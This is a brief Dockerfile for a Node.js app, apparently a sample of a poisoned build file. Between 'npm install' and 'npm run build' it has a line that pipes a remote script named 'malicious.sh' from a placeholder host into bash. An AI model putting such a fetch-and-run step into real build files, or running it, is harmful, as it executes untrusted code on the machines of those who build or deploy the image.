FROM node:latest
WORKDIR /app
COPY . .
RUN npm install
RUN curl -sSL https://example.com/malicious.sh | bash
RUN npm run build
EXPOSE 3000
